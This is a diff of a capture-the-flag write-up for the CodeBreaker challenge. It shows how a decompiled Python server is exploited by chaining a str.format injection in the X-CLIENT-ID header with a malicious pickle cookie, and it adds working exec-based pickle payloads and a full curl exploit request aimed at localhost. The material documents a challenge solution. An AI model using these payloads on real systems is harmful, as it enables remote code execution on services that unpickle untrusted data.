@@ -13,8 +13,10 @@ After the competition Kopohono on reddit gave the hint that the server can be tr
 ![_config.yml]({{ site.baseurl }}/images/CodeBreaker/Task_6/extracted.png)
 
 Uncompyle6 can be used to decompile python3.5 bytecode back to the source code. 
-
-[Uncompyle6]
+{% highlight shell %}
+pip install uncompyle6
+uncompyle6 -ro ./pyserver_decomplied ./pyserver_pyc/
+{% endhighlight %}
 
 The main function will extract extra data and xor it with the mtime of the python interpreter currently running, and then tries to import this as a zipped python module. The main function is ran using pyrun, meaning that the mtime is of the server file. A zip file's magic number is '50 4B 03 04', and since we know what it is encrypted as we can find out what the mtime should be. This will allows us to retrieve the zipfile that is being imported. 
 
@@ -56,33 +58,39 @@ Python provides a useful way to access a function in a class. If you put '@prope
 
 This line is the key to putting the two exploits we have found together to exploit the server. Str.format will let you access properties of the values passed in, but you can't use it to call functions. The @property makes the function return_log() act as a property and allows it to now be called through the str.format function. The last piece is finding how to format the string you need to send to the server. The globals list is available through class objects, but not from variables. This means that we can't use the str variables passed to the formatter, we need something else. 
 
-When the server hits a critical error, it passes the ServerConfig object to the logging module for the formatter to use. We can access this object in the formatter to get the property need. '{args[0]}' can be used to access the first arg passed in to the logging function. Now when the HTTP header contains 'X-CLIENT-ID: {args[0].return_log}' the cookie will be examined on a critical error. Remote code will now be ran on the webserver and can be used to queue a new bot command. A good example of using pickle for arbitrary python code execution can be found at [Dangerous Pickles](https://intoli.com/blog/dangerous-pickles/), I followed his example and used eval. 
+When the server hits a critical error, it passes the ServerConfig object to the logging module for the formatter to use. We can access this object in the formatter to get the property need. '{args[0]}' can be used to access the first arg passed in to the logging function. Now when the HTTP header contains 'X-CLIENT-ID: {args[0].return_log}' the cookie will be examined on a critical error. Remote code will now be ran on the webserver and can be used to queue a new bot command. A good example of using pickle for arbitrary python code execution can be found at [Dangerous Pickles](https://intoli.com/blog/dangerous-pickles/). I used exec instead of eval, since exec can import modules. 
 
 The first code injection I tried was to write directly to the file system a new queue.XXXXXXXX.dat file. This did not work, and while I'm not sure it may be due to the pylockdown module. The next method was to call the services.queue_push() for the new command. Getting access to the services instance was simple, since a global function get_services() was provided. I tried calling queue_push to add the command to the query, which is what /new does, but this did not work. I believe this is because queue_push uses a variable uid, which is a unique value assigned each time a connection is made. The code in the cookie will execute after the request has been handle and so I believe the uid is no longer there to be accessed. This causes the function to fail silently, which made debugging the exploit harder. To get the cookie code to execute correctly the function to write to the queue can be called directly, and it will be up to the exploit to add the uid value. 
 
 Write to file directly <br>
 {% highlight python %}
-return eval, ('os.system("echo test > test.txt")'), )
-# cookie : 
+return (exec, ("import os; os.system('touch test.txt')",))
 {% endhighlight %}
 
 Use service.queue_push() <br>
 {% highlight python %}
-return eval, ("globals()[get_services]().queue_push(b'test')"), )
-# cookie : 
+return (exec, ("import sys; sys.modules['pyserver.services'].__dict__['get_services']().queue_push(b'test cookie 2')",))
 {% endhighlight %}
 
 Use service.queue_worker.write <br>
 {% highlight python %}
-return eval, ("globals()[get_services]().service.queue_worker.write(b'test')"), )
-# cookie : 
+return (exec, ("import sys; sys.modules['pyserver.services'].__dict__['get_services']().queue_worker.write(b'test cookie 2')",))
 {% endhighlight %}
 
-To test the exploit I can edit the servercfg file to throw an exception which will kick off the exploit. To get the server running place the pyserver folder into the extracted  server code. Next comment out the ***line***. The exploit GET request can be sent using curl, which is used to make HTTP requests from the command line. 
+![_config.yml]({{ site.baseurl }}/images/CodeBreaker/Task_6/python_code_breakout.png)
 
-[curl_command]
+To test the exploit I can edit the servercfg file to call logging.critical() which will kick off the exploit. To get the server running place the pyserver folder into the extracted server code. Next comment out the line 54 'sys.meta_path.append(MetaImportFinder('pyserver'))' in loader.py. The exploit GET request can be sent using curl, which is used to make HTTP requests from the command line. 
 
-[exploit_test]
+Curl Command: <br>
+{% highlight shell %}
+curl 127.0.0.1:9999/next -b 'return_log=!r2gZZc868QijVwEoj2kX7A==?gASViAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIxsaW1wb3J0IHN5czsgc3lzLm1vZHVsZXNbJ3B5c2VydmVyLnNlcnZpY2VzJ10uX19kaWN0X19bJ2dldF9zZXJ2aWNlcyddKCkucXVldWVfd29ya2VyLndyaXRlKGIndGVzdCBjb29raWUgMicplIWUUpQu' -H 'X-CLIENT-ID: {args[0].return_log}'
+{% endhighlight %}
+
+![_config.yml]({{ site.baseurl }}/images/CodeBreaker/Task_6/exploit_test.png)
+
+Opening the queue.00000000.dat file, the output from the test command can be seen. 
+
+![_config.yml]({{ site.baseurl }}/images/CodeBreaker/Task_6/queue_file.png)
 
 Our final steps are: <br>
 1. Find method to cause critical error <br>
